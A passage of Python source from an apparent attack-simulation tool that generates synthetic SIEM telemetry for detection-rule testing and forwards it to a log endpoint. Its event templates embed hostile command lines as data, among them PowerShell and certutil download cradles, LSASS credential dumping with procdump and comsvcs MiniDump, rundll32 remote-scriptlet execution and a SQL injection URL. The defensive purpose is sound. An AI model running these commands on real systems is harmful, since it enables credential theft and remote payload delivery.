        names = ["admin", "administrator", "svc-backup", "billing", "finance", "hr", "itadmin", "orlevy", "david", "miriam", "backup", "support"]
        return [
            {
                "provider": "application_auth",
                "event_id": "AG-AUTH-USER-ENUM",
                "event_name": "UserEnumeration",
                "severity": "medium",
                "src_ip": "198.51.100.81",
                "url": f"/login/user-check?username={name}",
                "http_method": "GET",
                "status": 200 if name in {"admin", "svc-backup", "support"} else 404,
                "target_user": name,
                "user_exists": name in {"admin", "svc-backup", "support"},
                "rule_name": "Username enumeration response differential",
                "detection_focus": ["many usernames", "response differential", "single source"],
                "flow_stage": "user_enumeration",
                "request_index": index + 1,
            }
            for index, name in enumerate(names)
        ]
    template = _assistant_template(technique_id)
    expanded = [template]
    if technique_id.startswith("T1059"):
        expanded.extend(
            [
                {**template, "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgA", "rule_name": "Encoded PowerShell hidden execution"},
                {**template, "command_line": "cmd.exe /c whoami && hostname && ipconfig /all", "event_id": "1", "event_name": "ProcessCreate", "rule_name": "Command shell discovery chain"},
                {**template, "command_line": "powershell.exe -NoP -ExecutionPolicy Bypass Invoke-WebRequest http://203.0.113.10/a.ps1 -OutFile C:\\\\ProgramData\\\\a.ps1", "rule_name": "PowerShell download cradle"},
            ]
        )
    elif technique_id.startswith("T1003"):
        expanded.extend(
            [
                {**template, "image": "C:\\\\Windows\\\\System32\\\\procdump64.exe", "target_image": "C:\\\\Windows\\\\System32\\\\lsass.exe", "command_line": "procdump64.exe -ma lsass.exe C:\\\\ProgramData\\\\lsass.dmp", "rule_name": "ProcDump LSASS dump"},
                {**template, "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe", "command_line": "rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump 632 C:\\\\ProgramData\\\\lsass.dmp full", "rule_name": "Comsvcs MiniDump LSASS dump"},
            ]
        )
    elif technique_id.startswith("T1105"):
        expanded.extend(
            [
                {**template, "image": "C:\\\\Windows\\\\System32\\\\bitsadmin.exe", "command_line": "bitsadmin /transfer job http://203.0.113.10/stage2.dll C:\\\\ProgramData\\\\stage2.dll", "rule_name": "BITSAdmin ingress transfer"},
                {**template, "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "command_line": "powershell.exe iwr http://203.0.113.10/beacon.exe -OutFile C:\\\\Users\\\\Public\\\\beacon.exe", "rule_name": "PowerShell ingress transfer"},
            ]
        )
    return [{**item, "flow_stage": item.get("flow_stage") or _assistant_flow_stage_for_ttp(technique_id), "request_index": index + 1} for index, item in enumerate(expanded)]


def _assistant_flow_stage_for_ttp(technique_id: str) -> str:
    if technique_id.startswith("T1078"):
        return "valid_account_foothold"
    if technique_id.startswith("T1059"):
        return "execution_and_discovery"
    if technique_id.startswith("T1105"):
        return "ingress_tool_transfer"
    if technique_id.startswith("T1218"):
        return "defense_evasion_execution"
    if technique_id.startswith("T1003"):
        return "credential_access"
    if technique_id.startswith("T1547"):
        return "persistence_run_key"
    if technique_id.startswith("T1053"):
        return "persistence_scheduled_task"
    if technique_id.startswith("T1041"):
        return "exfiltration_channel"
    if technique_id.startswith("T1567"):
        return "exfiltration_to_cloud_service"
    if technique_id.startswith("T1082"):
        return "system_discovery"
    return "post_compromise"


def _assistant_complicated_templates_for_ttp(technique_id: str) -> list[dict[str, Any]]:
    if technique_id.startswith("T1046"):
        return [
            {
                "provider": "firewall",
                "source_format": "pan_traffic",
                "event_id": "TRAFFIC",
                "event_name": "PortScan",
                "severity": "medium",
                "src_ip": "10.20.30.44",
                "dest_ip": f"10.20.40.{index + 10}",
                "dest_port": [22, 80, 135, 139, 443, 445, 3389, 5985, 8080, 8443, 9200, 1433][index - 1],
                "protocol": "tcp",
                "action": "allow" if index % 4 else "deny",
                "rule_name": "Internal port sweep after foothold",
                "detection_focus": ["many destination ports", "internal sweep", "single source"],
                "flow_stage": "internal_network_discovery",
                "request_index": index,
                "original_vendor_pattern": True,
            }
            for index in range(1, 13)
        ]
    if technique_id.startswith("T1071.004"):
        domains = ["update-check.microsoft-security.invalid", "cdn-cache-cloudfront.invalid", "storage-api-backup.invalid", "graph-login-sync.invalid"]
        return [
            {
                "provider": "dns",
                "source_format": "bind_dns",
                "event_id": "QUERY",
                "event_name": "DnsQuery",
                "severity": "medium",
                "src_ip": "10.20.30.44",
                "query_name": domain,
                "query_type": "A",
                "response_code": "NOERROR" if index < 4 else "NXDOMAIN",
                "rule_name": "Suspicious beacon-like DNS lookups",
                "detection_focus": ["new domain", "rare domain", "post-compromise host"],
                "flow_stage": "c2_dns_resolution",
                "request_index": index,
                "original_vendor_pattern": True,
            }
            for index, domain in enumerate(domains, start=1)
        ]
    if technique_id.startswith("T1071.001"):
        return [
            {
                "provider": "edr",
                "source_format": "crowdstrike_json",
                "event_id": "NetworkConnectIP4",
                "event_name": "OutboundNetworkConnection",
                "severity": "high",
                "image": "C:\\\\Users\\\\Public\\\\beacon.exe",
                "src_ip": "10.20.30.44",
                "destination_ip": dest,
                "destination_port": 443,
                "protocol": "tcp",
                "rule_name": "Beacon process outbound connection",
                "detection_focus": ["unknown binary", "external TLS", "post-download execution"],
                "flow_stage": "command_and_control",
                "request_index": index,
                "original_vendor_pattern": True,
            }
            for index, dest in enumerate(["203.0.113.10", "203.0.113.11", "198.51.100.200"], start=1)
        ]
    base = _assistant_templates_for_ttp(technique_id)
    complicated: list[dict[str, Any]] = []
    for event in base:
        source_hint = str(event.get("provider") or "")
        if source_hint in {"nginx", "waf"}:
            source_format = "nginx_access" if source_hint == "nginx" else "modsecurity_waf"
        elif source_hint == "windows_security":
            source_format = "windows_event_xml"
        elif source_hint == "sysmon":
            source_format = "sysmon_xml"
        elif source_hint == "proxy":
            source_format = "bluecoat_proxy"
        else:
            source_format = "edr_json"
        complicated.append({**event, "source_format": source_format, "original_vendor_pattern": True})
    return complicated


def _assistant_add_cross_source_complicated_events(
    events: list[dict[str, Any]],
    run_id: str,
    mode: str,
    actor_profile: str,
    analyst_goal: str,
    ai_provider: str,
) -> list[dict[str, Any]]:
    extra_templates: list[tuple[str, dict[str, Any]]] = []
    for index in range(1, 13):
        extra_templates.append(
            (
                "T1046",
                {
                    "provider": "firewall",
                    "source_format": "pan_traffic",
                    "event_id": "TRAFFIC",
                    "event_name": "PortScan",
                    "severity": "medium",
                    "src_ip": "10.20.30.44",
                    "dest_ip": f"10.20.40.{index + 10}",
                    "dest_port": [22, 80, 135, 139, 443, 445, 3389, 5985, 8080, 8443, 9200, 1433][index - 1],
                    "protocol": "tcp",
                    "action": "allow" if index % 4 else "deny",
                    "rule_name": "Internal port sweep after foothold",
                    "detection_focus": ["many destination ports", "internal sweep", "single source"],
                    "flow_stage": "internal_network_discovery",
                    "request_index": index,
                    "original_vendor_pattern": True,
                },
            )
        )
    for index, domain in enumerate(["update-check.microsoft-security.invalid", "cdn-cache-cloudfront.invalid", "storage-api-backup.invalid", "graph-login-sync.invalid"], start=1):
        extra_templates.append(
            (
                "T1071.004",
                {
                    "provider": "dns",
                    "source_format": "bind_dns",
                    "event_id": "QUERY",
                    "event_name": "DnsQuery",
                    "severity": "medium",
                    "src_ip": "10.20.30.44",
                    "query_name": domain,
                    "query_type": "A",
                    "response_code": "NOERROR" if index < 4 else "NXDOMAIN",
                    "rule_name": "Suspicious beacon-like DNS lookups",
                    "detection_focus": ["new domain", "rare domain", "post-compromise host"],
                    "flow_stage": "c2_dns_resolution",
                    "request_index": index,
                    "original_vendor_pattern": True,
                },
            )
        )
    for index, dest in enumerate(["203.0.113.10", "203.0.113.11", "198.51.100.200"], start=1):
        extra_templates.append(
            (
                "T1071.001",
                {
                    "provider": "edr",
                    "source_format": "crowdstrike_json",
                    "event_id": "NetworkConnectIP4",
                    "event_name": "OutboundNetworkConnection",
                    "severity": "high",
                    "image": "C:\\\\Users\\\\Public\\\\beacon.exe",
                    "src_ip": "10.20.30.44",
                    "destination_ip": dest,
                    "destination_port": 443,
                    "protocol": "tcp",
                    "rule_name": "Beacon process outbound connection",
                    "detection_focus": ["unknown binary", "external TLS", "post-download execution"],
                    "flow_stage": "command_and_control",
                    "request_index": index,
                    "original_vendor_pattern": True,
                },
            )
        )
    output = list(events)
    for technique_id, template in extra_templates:
        output.append(_assistant_event_for_ttp(technique_id, run_id, len(output) + 1, mode, actor_profile, analyst_goal, template, ai_provider, True))
    return output


def _assistant_vendor_raw_line(event: dict[str, Any]) -> str:
    source_format = str(event.get("source_format") or "edr_json")
    timestamp = str(event.get("timestamp") or datetime.now(timezone.utc).isoformat())
    if source_format == "windows_event_xml":
        return (
            f'<Event><System><Provider Name="{event.get("provider")}"/><EventID>{event.get("event_id")}</EventID>'
            f'<TimeCreated SystemTime="{timestamp}"/><Computer>{event.get("host")}</Computer></System>'
            f'<EventData><Data Name="TargetUserName">{event.get("target_user", "-")}</Data>'
            f'<Data Name="IpAddress">{event.get("src_ip", "-")}</Data><Data Name="LogonType">{event.get("logon_type", "-")}</Data>'
            f'<Data Name="FailureReason">{event.get("failure_reason", "-")}</Data>'
            f'<Data Name="RunId">{event.get("run_id")}</Data><Data Name="Technique">{event.get("technique_id")}</Data></EventData></Event>'
        )
    if source_format == "sysmon_xml":
        return (
            f'<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>{event.get("event_id")}</EventID>'
            f'<TimeCreated SystemTime="{timestamp}"/><Computer>{event.get("host")}</Computer></System>'
            f'<EventData><Data Name="Image">{event.get("image", "-")}</Data><Data Name="CommandLine">{event.get("command_line", "-")}</Data>'
            f'<Data Name="ParentImage">{event.get("parent_image", "-")}</Data><Data Name="TargetImage">{event.get("target_image", "-")}</Data>'
            f'<Data Name="RuleName">{event.get("rule_name")}</Data><Data Name="RunId">{event.get("run_id")}</Data></EventData></Event>'
        )
    if source_format == "nginx_access":
        return (
            f'{event.get("src_ip", "198.51.100.77")} - - [{_apache_log_time(timestamp)}] '
            f'"{event.get("http_method", "GET")} {event.get("url", "/")} HTTP/1.1" {int(event.get("status") or 0)} 512 "-" '
            f'"{event.get("user_agent", "Mozilla/5.0")}" rt=0.003 run_id="{event.get("run_id")}" technique="{event.get("technique_id")}"'
        )
    if source_format == "modsecurity_waf":
        return (
            f'{timestamp} ModSecurity: Warning. Matched "{event.get("canary_classification", "attack")}" at REQUEST_URI. '
            f'[id "9{hashlib.sha1(str(event.get("rule_name")).encode()).hexdigest()[:6]}"] [severity "{event.get("severity", "high")}"] '
            f'[msg "{event.get("rule_name")}"] [client "{event.get("src_ip", "-")}"] [uri "{event.get("url", "-")}"] '
            f'[unique_id "{event.get("run_id")}"] [tag "{event.get("technique_id")}"]'
        )
    if source_format == "pan_traffic":
        return (
            f'1,{timestamp},001801000001,TRAFFIC,end,2561,{timestamp},{event.get("src_ip")},{event.get("dest_ip")},0.0.0.0,0.0.0.0,'
            f'allow-any,,,ssl,vsys1,trust,untrust,ethernet1/1,ethernet1/2,log-forward,{timestamp},1,{event.get("dest_port")},'
            f'{event.get("dest_port")},0,0,0x0,{event.get("protocol")},{event.get("action")},512,256,1,{event.get("rule_name")},'
            f'run_id={event.get("run_id")},technique={event.get("technique_id")}'
        )
    if source_format == "bind_dns":
        return (
            f'{timestamp} client @{event.get("src_ip")}#53532 ({event.get("query_name")}): query: {event.get("query_name")} '
            f'IN {event.get("query_type", "A")} +E(0)K ({event.get("response_code")}) run_id={event.get("run_id")} technique={event.get("technique_id")}'
        )
    if source_format == "bluecoat_proxy":
        return (
            f'{timestamp} {event.get("src_ip", "10.20.30.55")} {event.get("dest_host", "example.invalid")} '
            f'{event.get("http_method", "POST")} {event.get("url", "/")} 200 TCP_MISS bytes_out={event.get("bytes_out", 0)} '
            f'user={event.get("user", "-")} run_id={event.get("run_id")} technique={event.get("technique_id")}'
        )
    payload = {
        "metadata": {"vendor": "CrowdStrike", "product": "Falcon", "event_simpleName": event.get("event_id"), "run_id": event.get("run_id")},
        "event": {key: value for key, value in event.items() if key not in {"raw_line", "message"}},
    }
    return json.dumps(payload, sort_keys=True)


def _assistant_template(technique_id: str) -> dict[str, Any]:
    if technique_id.startswith("T1190"):
        return {
            "provider": "waf",
            "event_id": "AG-WAF-1190",
            "event_name": "ExploitPublicFacingApplication",
            "severity": "high",
            "src_ip": "203.0.113.45",
            "url": "/search?q=%27%20UNION%20SELECT%20password%20FROM%20users--",
            "http_method": "GET",
            "status": 403,
            "rule_name": "SQL injection against public web endpoint",
            "detection_focus": ["sqli payload", "blocked request", "public endpoint"],
        }
    if technique_id.startswith("T1595"):
        return {
            "provider": "nginx",
            "event_id": "AG-WEB-1595",
            "event_name": "ActiveScanning",
            "severity": "medium",
            "src_ip": "198.51.100.77",
            "url": "/.git/config",
            "http_method": "GET",
            "status": 404,
            "user_agent": "sqlmap/1.7",
            "rule_name": "Tool fingerprint and sensitive path discovery",
            "detection_focus": ["tool user-agent", "sensitive path", "404 burst"],
        }
    if technique_id.startswith("T1110"):
        return {
            "provider": "windows_security",
            "event_id": "4625",
            "event_name": "FailedLogon",
            "severity": "high",
            "logon_type": "3",
            "target_user": "svc-backup",
            "src_ip": "10.20.30.44",
            "failure_reason": "Bad password",
            "rule_name": "Password spraying or brute-force failures",
            "detection_focus": ["4625 burst", "single password pattern", "many users or repeated service account"],
        }
    if technique_id.startswith("T1078"):
        return {
            "provider": "windows_security",
            "event_id": "4624",
            "event_name": "SuccessfulLogon",
            "severity": "medium",
            "logon_type": "10",
            "target_user": "admin.ops",
            "src_ip": "10.20.30.44",
            "rule_name": "Valid account remote interactive logon from unusual source",
            "detection_focus": ["first seen source", "privileged account", "post-failure success"],
        }
    if technique_id.startswith("T1003"):
        return {
            "provider": "sysmon",
            "event_id": "10",
            "event_name": "ProcessAccess",
            "severity": "critical",
            "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",
            "target_image": "C:\\\\Windows\\\\System32\\\\lsass.exe",
            "granted_access": "0x1010",
            "call_trace": "dbghelp.dll;comsvcs.dll",
            "rule_name": "Credential dumping access to LSASS",
            "detection_focus": ["lsass target", "suspicious access mask", "dump-capable module"],
        }
    if technique_id.startswith("T1105"):
        return {
            "provider": "sysmon",
            "event_id": "1",
            "event_name": "ProcessCreate",
            "severity": "high",
            "image": "C:\\\\Windows\\\\System32\\\\certutil.exe",
            "parent_image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "command_line": "certutil.exe -urlcache -split -f http://203.0.113.10/payload.dat C:\\\\ProgramData\\\\payload.dat",
            "rule_name": "Ingress tool transfer with certutil",
            "detection_focus": ["certutil", "urlcache", "external URL", "ProgramData destination"],
        }
    if technique_id.startswith("T1547"):
        return {
            "provider": "sysmon",
            "event_id": "13",
            "event_name": "RegistryValueSet",
            "severity": "high",
            "target_object": "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater",
            "details": "C:\\\\Users\\\\alice\\\\AppData\\\\Roaming\\\\updater.exe",
            "rule_name": "Run key persistence",
            "detection_focus": ["Run key", "user profile executable", "new autorun value"],
        }
    if technique_id.startswith("T1053"):
        return {
            "provider": "windows_security",
            "event_id": "4698",
            "event_name": "ScheduledTaskCreated",
            "severity": "high",
            "task_name": "\\\\Microsoft\\\\Windows\\\\UpdateHealth\\\\CacheTask",
            "task_content": "powershell.exe -ExecutionPolicy Bypass -File C:\\\\ProgramData\\\\cache.ps1",
            "rule_name": "Suspicious scheduled task persistence",
            "detection_focus": ["4698", "PowerShell action", "masqueraded task path"],
        }
    if technique_id.startswith("T1218"):
        return {
            "provider": "sysmon",
            "event_id": "1",
            "event_name": "ProcessCreate",
            "severity": "high",
            "image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",
            "parent_image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
            "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:http://203.0.113.10/a.sct\")",
            "rule_name": "Signed binary proxy execution",
            "detection_focus": ["rundll32", "mshtml RunHTMLApplication", "remote scriptlet"],
        }
    if technique_id.startswith("T1041") or technique_id.startswith("T1567"):
        return {
            "provider": "proxy",
            "event_id": "AG-PROXY-EXFIL",
            "event_name": "ExfiltrationOverWebService",
            "severity": "high",
            "src_ip": "10.20.30.55",
            "dest_host": "files.example-upload.invalid",
            "bytes_out": 52428800,
            "http_method": "POST",
            "url": "/api/upload",
            "rule_name": "Large outbound upload after endpoint compromise",
            "detection_focus": ["large bytes_out", "new destination", "POST upload"],
        }
    return {
        "provider": "sysmon",
        "event_id": "1",
        "event_name": "ProcessCreate",
        "severity": "medium",
        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
        "parent_image": "C:\\\\Windows\\\\explorer.exe",
        "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA",
        "rule_name": f"Suspicious process behavior mapped to {technique_id}",
        "detection_focus": ["process command line", "parent process", "ATT&CK mapping"],
    }


def _assistant_siem_event_shape(event: dict[str, Any]) -> dict[str, Any]:
    return {
        "Event": {
            "System": {
                "Provider": {"Name": event.get("provider")},
                "EventID": event.get("event_id"),
                "Computer": event.get("host"),
                "TimeCreated": {"SystemTime": event.get("timestamp")},
            },
            "EventData": {key: value for key, value in event.items() if key not in {"raw_line", "message"}},
        }
    }


def _assistant_attack_plan(
    events: list[dict[str, Any]],
    mode: str,
    actor_profile: str,
    analyst_goal: str,
    ai_provider: str,
    complicated_attack: bool,
) -> dict[str, Any]:
    grouped: dict[tuple[str, str], dict[str, Any]] = {}
    for event in events:
        key = (str(event.get("technique_id")), str(event.get("flow_stage") or "activity"))
        if key not in grouped:
            grouped[key] = {
                "step": len(grouped) + 1,
                "technique_id": event["technique_id"],
                "event_source": event["provider"],
                "event_id": event["event_id"],
                "detection_goal": event["rule_name"],
                "focus": event["detection_focus"],
                "flow_stage": event.get("flow_stage") or "activity",
                "source_format": event.get("source_format") or "normalized_json",
                "event_count": 0,
            }
        grouped[key]["event_count"] += 1
    scenario_summary = (
        f"AI assistant generated a coherent web-to-endpoint intrusion kill chain with {len(events)} correlated telemetry events "
        f"across {len(grouped)} ordered phases for {actor_profile or mode}."
        if complicated_attack
        else f"AI assistant generated {len(events)} correlated telemetry events across {len(grouped)} attack phases for {actor_profile or mode}."
    )
    return {
        "summary": scenario_summary,
        "mode": mode,
        "ai_provider": ai_provider,
        "complicated_attack": complicated_attack,
        "payload_style": "original vendor/source raw lines" if complicated_attack else "structured JSON events",
        "actor_profile": actor_profile,
        "analyst_goal": analyst_goal,
        "kill_chain": list(grouped.values()),
        "validation_note": "Generated telemetry is for SIEM rule validation and detection engineering drills. It is not proof of real compromise.",
    }


def _siem_payload_body(logs: dict[str, Any], payload_format: str) -> bytes:
    if payload_format == "json_lines":
        lines = [_siem_event_payload(event, logs) for event in logs["events"]]
        return ("\n".join(json.dumps(item, sort_keys=True) for item in lines) + "\n").encode("utf-8")
    payload = {
        "product": "AdversaryGraph",
        "module": "Attack Simulation",
        "sent_at": datetime.now(timezone.utc).isoformat(),
        "source": logs["source"],
        "run_id": logs["run_id"],
        "log_file": logs["log_file"],
        "event_count": logs["line_count"],
        "events": logs["events"],
    }
    return json.dumps(payload).encode("utf-8")


def _siem_event_payload(event: dict[str, Any], logs: dict[str, Any]) -> dict[str, Any]:
    payload = {
        "product": "AdversaryGraph",
        "module": "Attack Simulation",
        "source": logs["source"],
        "run_id": event.get("run_id") or logs["run_id"],
        "event_type": event.get("event_type", "attack_simulation_event"),
        "time": event.get("timestamp") or datetime.now(timezone.utc).isoformat(),
        "message": _siem_event_message(event),
    }
    payload.update(event)
    return payload


def _siem_event_message(event: dict[str, Any]) -> str:
    parts = [
        str(event.get("event_type") or "attack_simulation_event"),
        str(event.get("simulation_id") or ""),
        str(event.get("method") or ""),
        str(event.get("path") or event.get("url") or ""),
        str(event.get("run_id") or ""),
        str(event.get("analyst_note") or ""),
    ]
    return " ".join(item for item in parts if item)


def _siem_raw_line_payload(event: dict[str, Any]) -> bytes:
    line = str(event.get("raw_line") or event.get("message") or "").rstrip("\n")
    if not line:
        line = json.dumps(event, sort_keys=True)
    return f"{line}\n".encode("utf-8")


def _forward_siem_events_individually(
    destination: str,
    logs: dict[str, Any],
    headers: dict[str, str],
    started: float,
    original_destination: str,
    connection_mode: str,
    allow_http_fallback: bool,
    payload_format: str,
) -> dict[str, Any]:
    events = logs["events"] or [
        {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event_type": "attack_simulation_no_events",
            "run_id": logs["run_id"],
            "message": "No Attack Simulation telemetry events matched the selected source/run filter.",
        }
    ]
    sent = 0
    last_result: dict[str, Any] | None = None
    fallback_used = False
    fallback_note = ""
    errors: list[str] = []
    for event in events:
        body = (
            _siem_raw_line_payload(event)
            if payload_format == "raw_lines"
            else json.dumps(_siem_event_payload(event, logs), sort_keys=True).encode("utf-8")
        )
        result, note = _post_siem_payload(
            destination=destination,
            body=body,
            headers=headers,
            started=started,
            original_destination=original_destination,
            connection_mode=connection_mode,
            allow_http_fallback=allow_http_fallback,
        )
        last_result = result
        fallback_used = fallback_used or bool(note)
        fallback_note = fallback_note or note
        if result["ok"]:
            sent += 1
        else:
            errors.append(result.get("error") or f"HTTP {result.get('status')}")
            break
    ok = sent == len(events) and not errors
    return {
        "ok": ok,
        "status": int(last_result.get("status", 0)) if last_result else 0,
        "destination_url": last_result.get("destination_url", _redact_siem_destination(destination)) if last_result else _redact_siem_destination(destination),
        "connection_mode": connection_mode,
        "duration_ms": round((time.perf_counter() - started) * 1000, 3),
        "error": "" if ok else "; ".join(errors),
        "response_preview": last_result.get("response_preview", "") if last_result else "",
        "response_headers": last_result.get("response_headers", {}) if last_result else {},
        "source": logs["source"],
        "run_id": logs["run_id"],
        "event_count": logs["line_count"],
        "http_fallback_used": fallback_used,
        "fallback_note": fallback_note,
        "payload_format": payload_format,
        "sent_event_count": sent,
    }


def _post_siem_payload(
    destination: str,
    body: bytes,
    headers: dict[str, str],
    started: float,
    original_destination: str,
    connection_mode: str,
    allow_http_fallback: bool,
) -> tuple[dict[str, Any], str]:
    _ensure_strict_loopback_bridge(destination, connection_mode)
    try:
        return _post_siem_payload_once(destination, body, headers, started, original_destination, connection_mode), ""
    except (URLError, OSError) as exc:
        error = str(getattr(exc, "reason", exc))
        fallback_destination = _http_fallback_destination(destination)
        if allow_http_fallback and fallback_destination and _is_tls_protocol_error(error):
            fallback_result = _post_siem_payload_once(fallback_destination, body, headers, started, original_destination, connection_mode)
            return fallback_result, "HTTPS failed with a TLS protocol error; retried the same destination with http://."
        return {
            "ok": False,
            "status": 0,
            "destination_url": _redact_siem_destination(destination),
            "connection_mode": connection_mode,
            "error": _siem_connection_error(error, original_destination, destination, connection_mode),
            "response_preview": "",
            "response_headers": {},
        }, ""


def _post_siem_payload_once(
    destination: str,
    body: bytes,
    headers: dict[str, str],
    started: float,
    original_destination: str,
    connection_mode: str,
) -> dict[str, Any]:
    req = request.Request(destination, data=body, method="POST", headers=headers)
    try:
        with request.urlopen(req, timeout=10) as response:
            response_body = response.read(2048).decode("utf-8", errors="replace")
            status = response.status
            ok = 200 <= status < 300
            response_headers = dict(response.headers.items())
    except HTTPError as exc:
        response_body = exc.read(2048).decode("utf-8", errors="replace")
        status = exc.code
        ok = False
        response_headers = dict(exc.headers.items())
    return {
        "ok": ok,
        "status": status,
        "destination_url": _redact_siem_destination(destination),
        "connection_mode": connection_mode,
        "duration_ms": round((time.perf_counter() - started) * 1000, 3),
        "error": "" if ok else response_body[:500],
        "response_preview": response_body[:500],
        "response_headers": response_headers,
    }


def _http_fallback_destination(destination: str) -> str:
    parsed = parse.urlparse(destination)
    if parsed.scheme != "https":
        return ""
    return parse.urlunparse(parsed._replace(scheme="http"))


def _is_tls_protocol_error(error: str) -> bool:
    lowered = error.lower()
    return "wrong version number" in lowered or "record layer failure" in lowered or "unknown protocol" in lowered


def _ensure_strict_loopback_bridge(destination: str, connection_mode: str) -> None:
    if connection_mode != "direct" or not _running_in_container():
        return
    parsed = parse.urlparse(destination)
    if parsed.hostname not in {"127.0.0.1", "localhost"} or not parsed.port:
        return
    port = parsed.port
    if port == _LAB_WEB_PORT:
        return
    with _LOOPBACK_BRIDGES_LOCK:
        if port in _LOOPBACK_BRIDGES:
            return
        ready = threading.Event()
        failed: list[str] = []
        thread = threading.Thread(
            target=_run_loopback_host_bridge,
            args=(port, ready, failed),
            name=f"siem-loopback-bridge-{port}",
            daemon=True,
        )
        thread.start()
        ready.wait(timeout=1.5)
        if failed:
            logger.info("Strict loopback bridge not started for port %s: %s", port, failed[0])
            return
        _LOOPBACK_BRIDGES.add(port)
        logger.info("Started strict loopback SIEM bridge 127.0.0.1:%s -> host.docker.internal:%s", port, port)


def _run_loopback_host_bridge(port: int, ready: threading.Event, failed: list[str]) -> None:
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("127.0.0.1", port))
        server.listen(20)
    except OSError as exc:
        failed.append(str(exc))
        ready.set()
        return
    ready.set()
    while True:
        try:
            client, _ = server.accept()
        except OSError:
            return
        threading.Thread(target=_handle_loopback_bridge_client, args=(client, port), daemon=True).start()


def _handle_loopback_bridge_client(client: socket.socket, port: int) -> None:
    upstream: socket.socket | None = None
    try:
        upstream = socket.create_connection(("host.docker.internal", port), timeout=5)
        client.setblocking(False)
        upstream.setblocking(False)
        sockets = [client, upstream]
        while True:
            readable, _, errored = select.select(sockets, [], sockets, 15)
            if errored:
                return
            if not readable:
                return
            for source in readable:
                try:
                    data = source.recv(65536)
                except OSError:
                    return
                if not data:
                    return
                target = upstream if source is client else client
                target.sendall(data)
    except OSError as exc:
        logger.warning("Strict loopback SIEM bridge failed for port %s: %s", port, exc)
    finally:
        try:
            client.close()
        except OSError:
            pass
        if upstream is not None:
            try:
                upstream.close()
            except OSError:
                pass


def _tail_jsonl(path: Path, limit: int, run_id: str = "") -> list[dict[str, Any]]:
    if not path.exists():
        return []
    events: list[dict[str, Any]] = []
    with path.open("r", encoding="utf-8") as handle:
        for line in handle:
            line = line.strip()
            if not line:
                continue
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                event = {"event_type": "parse_error", "raw": line}
            if run_id and event.get("run_id") != run_id:
                continue
            events.append(event)
            if len(events) > limit:
                events = events[-limit:]
    return events


def _tail_text_log(path: Path, source: str, limit: int, run_id: str = "") -> list[dict[str, Any]]:
    if not path.exists():
        return []
    events: list[dict[str, Any]] = []
    with path.open("r", encoding="utf-8", errors="replace") as handle:
        for line_number, line in enumerate(handle, start=1):
            raw = line.rstrip("\n")
            if not raw:
                continue
            if run_id and run_id not in raw:
                continue
            event = _text_log_event(source, raw, line_number)
            events.append(event)
            if len(events) > limit:
                events = events[-limit:]
    return events


def _tail_attacked_server_logs(limit: int, run_id: str = "") -> list[dict[str, Any]]:
    sources = [
        ("access", _web_server_access_log_path()),
        ("auth", _web_auth_log_path()),
        ("security", _web_security_log_path()),
        ("error", _web_error_log_path()),
        ("endpoint", _endpoint_log_path()),
    ]
    events: list[dict[str, Any]] = []
    for source, path in sources:
        events.extend(_tail_text_log(path, source=source, limit=limit, run_id=run_id))
    web_events = _tail_jsonl(_web_access_log_path(), limit=limit, run_id=run_id)
    for event in web_events:
        event.setdefault("source", "web")
        event.setdefault("event_type", "lab_web_access")
        event.setdefault("message", _siem_event_message(event))
        events.append(event)
    events.sort(key=_event_sort_key)
    return events[-limit:]


def _event_sort_key(event: dict[str, Any]) -> tuple[str, int]:
    return (str(event.get("timestamp") or ""), int(event.get("line_number") or event.get("request_index") or 0))


def _text_log_event(source: str, raw: str, line_number: int) -> dict[str, Any]:
    event: dict[str, Any] = {
        "timestamp": _timestamp_from_log_line(raw) or datetime.now(timezone.utc).isoformat(),
        "event_type": f"lab_web_{source}_log",
        "source": source,
        "line_number": line_number,
        "raw_line": raw,
        "message": raw,
    }
    run_match = re.search(r'run_id="?([^"\s]+)"?', raw)
    sim_match = re.search(r'simulation_id="?([^"\s]+)"?', raw)
    method_path_match = re.search(r'"(GET|POST|HEAD|PUT|DELETE|PATCH|OPTIONS)\s+([^"\s]+)', raw)
    status_match = re.search(r'"\s+(\d{3})\s+', raw) or re.search(r"\bHTTP\s+(\d{3})\b", raw) or re.search(r"\bstatus=(\d{3})\b", raw)
    client_match = re.search(r"^(\S+)\s", raw) or re.search(r'client="?([^"\s]+)"?', raw) or re.search(r"\[client ([^\]]+)\]", raw)
    if run_match:
        event["run_id"] = run_match.group(1)
    if sim_match:
        event["simulation_id"] = sim_match.group(1)
    if method_path_match:
        event["method"] = method_path_match.group(1)
        event["path"] = method_path_match.group(2)
    if status_match:
        event["status"] = int(status_match.group(1))
    if client_match:
        event["client_ip"] = client_match.group(1)
    if source == "security":
        category_match = re.search(r'category="([^"]+)"', raw)
        severity_match = re.search(r'severity="([^"]+)"', raw)
        if category_match:
            event["matched_canaries"] = [category_match.group(1)]
        if severity_match:
            event["severity"] = severity_match.group(1)
    if source == "auth":
        for key, field in {
            "auth_outcome": "event",
            "credential_attack_type": "attack_type",
            "auth_username": "user",
            "auth_user_hash": "user_hash",
            "auth_failure_reason": "failure_reason",
            "password_sha256": "password_sha256",
        }.items():
            match = re.search(rf'{field}="([^"]*)"', raw)
            if match:
                event[key] = match.group(1)
        exists_match = re.search(r"\buser_exists=(true|false)\b", raw)
        password_len_match = re.search(r"\bpassword_len=(\d+)\b", raw)
        if exists_match:
            event["auth_user_exists"] = exists_match.group(1) == "true"
        if password_len_match:
            event["password_length"] = int(password_len_match.group(1))
    return event


def _timestamp_from_log_line(raw: str) -> str:
